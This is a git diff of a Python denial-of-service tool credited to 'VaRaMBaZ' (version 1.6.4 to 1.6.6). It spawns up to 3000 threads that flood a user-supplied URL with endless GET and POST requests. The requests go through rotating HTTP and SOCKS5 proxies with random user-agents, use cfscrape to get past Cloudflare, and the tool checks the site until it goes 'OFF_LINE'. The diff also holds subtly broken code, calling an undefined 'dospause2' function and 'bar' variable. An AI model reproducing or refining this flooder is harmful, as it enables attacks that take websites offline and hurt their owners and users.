@@ -1,22 +1,23 @@
-import time
-
 import colorama
+from colorama import Style
 import threading
 import random
 import requests
 import cfscrape
 import os
 import pyAesCrypt
+import time
+from numba import prange
 
 os.system("clear")
 
 s = cfscrape.create_scraper()
 
-#Получение User-Agent
+# Получение User-Agent
 with open('useragent') as file:
     headersp = ''.join(file.readlines()).strip().split('\n')
 
-#Расшифровка прокси
+# Шифрование и получение прокси
 filedecrypthttp = "proxyhttp.crp"
 filedecryptsocks = "proxysocks.crp"
 password = "0xdrqdsdwgfegvefgtruoobcdsm"
@@ -25,62 +26,87 @@ password = "0xdrqdsdwgfegvefgtruoobcdsm"
 def decryptionhttp():
     buffer_size = 512 * 1024
     pyAesCrypt.decryptFile(str(filedecrypthttp), str(os.path.splitext(filedecrypthttp)[0]), password, buffer_size)
+
+
 decryptionhttp()
 
 with open('proxyhttp') as file:
     proxy_http = ''.join(file.readlines()).strip().split('\n')
 os.remove("proxyhttp")
 
+
 def decryptionsocks():
     buffer_size = 512 * 1024
     pyAesCrypt.decryptFile(str(filedecryptsocks), str(os.path.splitext(filedecryptsocks)[0]), password, buffer_size)
+
+
 decryptionsocks()
 
 with open('proxysocks') as file:
     proxy_socks = ''.join(file.readlines()).strip().split('\n')
 os.remove("proxysocks")
 
-
-def dos1(target):
+# Аттака
+def dos1_1(target):
     while True:
-        # FakeUserAgent
         useragent = random.choice(headersp)
-        useragent2 = random.choice(headersp)
-        useragent3 = random.choice(headersp)
-        useragent4 = random.choice(headersp)
+        header = {'user-agent': useragent}
 
-        # RandomProxy
+        useragent2 = random.choice(headersp)
+        header2 = {'user-agent': useragent2}
+
         proxyagenthttp = random.choice(proxy_http)
         proxyagentsocks = random.choice(proxy_socks)
-        proxyagenthttp2 = random.choice(proxy_http)
-        proxyagentsocks2 = random.choice(proxy_socks)
 
-        # Запросы GET
+        proxieshttphttp = {
+            'http': f'http://{proxyagenthttp}',
+            'https': f'http://{proxyagenthttp}'
+        }
+        proxiessockshttp = {
+            'http': f'socks5://{proxyagentsocks}',
+            'https': f'socks5://{proxyagentsocks}'
+        }
+
         try:
-            s.get(target, headers={'user-agent': useragent},
-                  proxies={'http': proxyagenthttp, 'https': proxyagenthttp})
+            s.get(target, headers=header, proxies=proxieshttphttp)
         except:
             pass
 
         try:
-            s.get(target, headers={'user-agent': useragent2},
-                  proxies={'http': proxyagentsocks, 'https': proxyagentsocks})
+            s.get(target, headers=header2, proxies=proxiessockshttp)
         except:
             pass
 
-        # Запросы POST
+
+def dos1_2(target):
+    while True:
+        useragent = random.choice(headersp)
+        header = {'user-agent': useragent}
+
+        useragent2 = random.choice(headersp)
+        header2 = {'user-agent': useragent2}
+
+        proxyagenthttp = random.choice(proxy_http)
+        proxyagentsocks = random.choice(proxy_socks)
+
+        proxieshttphttp = {
+            'http': f'http://{proxyagenthttp}',
+            'https': f'http://{proxyagenthttp}'
+        }
+        proxiessockshttp = {
+            'http': f'socks5://{proxyagentsocks}',
+            'https': f'socks5://{proxyagentsocks}'
+        }
+
         try:
-            s.post(target, headers={'user-agent': useragent3},
-                   proxies={'http': proxyagenthttp2, 'https': proxyagenthttp2})
+            s.post(target, headers=header, proxies=proxieshttphttp)
         except:
             pass
 
         try:
-            s.post(target, headers={'user-agent': useragent4},
-                   proxies={'http': proxyagentsocks2, 'https': proxyagentsocks2})
+            s.post(target, headers=header2, proxies=proxiessockshttp)
         except:
             pass
-
 
 def dos2(target):
     while True:
@@ -101,8 +127,7 @@ print("   \\-\    //-/    //========\\-\   ||=========     ||    |=-|  ||     |-
 print("    \\-\  //-/    //-/        \\-\  ||-|     \\-\    ||    |=-|  ||     |-|   ___|| |-|   ")
 print("     \\-\//-/    //-/          \\-\ ||-|      \\-\   ||====/-/   \\=====/-/ ||======|-| \n")
 print("Creator: VaRaMBaZ")
-print("Version: 1.6.4; Optimizing the attack \n")
-
+print("Version: 1.6.6; Optimazed attack \n")
 
 url = input("URL: ")
 if not url.__contains__("http"):
@@ -112,33 +137,39 @@ if not url.__contains__("."):
     exit(colorama.Fore.RED + "Invalid domain")
 
 try:
-    threads = int(input("Threads[max 1000]: "))
+    threads = int(input("Threads[max 3000]: "))
 except ValueError:
     exit(colorama.Fore.RED + "Threads count is incorrect!")
 
-if threads == 0 or threads > 1000:
+if threads == 0 or threads > 3000:
     exit(colorama.Fore.RED + "Threads count is incorrect!")
 
 proxyuseage = int(input("Use a proxy?[1-yes; 2-no]: "))
 print("")
 
 print(colorama.Fore.YELLOW + "Starting threads...")
-if (proxyuseage == 1):
-    for i in range(0, threads):
-        thr = threading.Thread(target=dos1, args=(url,))
-        thr.start()
+if proxyuseage == 1:
+    for i in prange(0, threads):
+        threading.Thread(target=dos1_1, args=(url,)).start()
+        threading.Thread(target=dos1_2, args=(url,)).start()
 else:
-    for i in range(0, threads):
-        thr2 = threading.Thread(target=dos2, args=(url,))
+    for i in prange(0, threads):
+        thr2 = threading.Thread(target=dospause2, args=(bar, url,))
         thr2.start()
 print(colorama.Fore.GREEN + "All threads are running!")
+print(Style.RESET_ALL)
 
 while True:
     useragent = random.choice(headersp)
-    proxyagenthttp = random.choice(proxy_http)
+    header = {'user-agent': useragent}
 
+    proxyagenthttp = random.choice(proxy_http)
+    proxieshttphttp = {
+        'http': f'http://{proxyagenthttp}',
+        'https': f'http://{proxyagenthttp}',
+    }
     try:
-        checksite = requests.post(url, headers={'user-agent': useragent}, proxies={'http': f'http://{proxyagenthttp}', 'https': f'http://{proxyagenthttp}'})
+        checksite = requests.post(url, headers=header, proxies=proxieshttphttp)
         if checksite.status_code >= 500:
             statustext = "OFF_LINE"
         else:
